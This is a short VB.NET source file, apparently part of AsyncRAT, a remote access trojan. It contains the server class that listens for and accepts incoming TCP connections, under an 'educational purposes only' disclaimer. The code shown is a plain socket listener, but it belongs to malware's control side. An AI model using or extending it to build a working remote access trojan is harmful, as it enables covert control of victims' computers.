Imports System.Net.Sockets
Imports System.Net

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.

Public Class Server
    Public S As Socket

    Async Sub Start(ByVal Port As Integer)
        Try
            S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            Dim IpEndPoint As IPEndPoint = New IPEndPoint(IPAddress.Any, Port)

            S.ReceiveBufferSize = 1024 * 500
            S.SendBufferSize = 1024 * 500
            S.Bind(IpEndPoint)
            S.Listen(999)

            While True
                Threading.Thread.Sleep(1)
                'Await Task.Delay(1)
                S.BeginAccept(New AsyncCallback(AddressOf EndAccept), S)
            End While
        Catch ex As Exception
            MsgBox(ex.Message)
            Environment.Exit(0)
        End Try
    End Sub

    Sub EndAccept(ByVal ar As IAsyncResult)
        Try
            Dim C As New Client(S.EndAccept(ar))
        Catch ex As Exception
        End Try
    End Sub

End Class
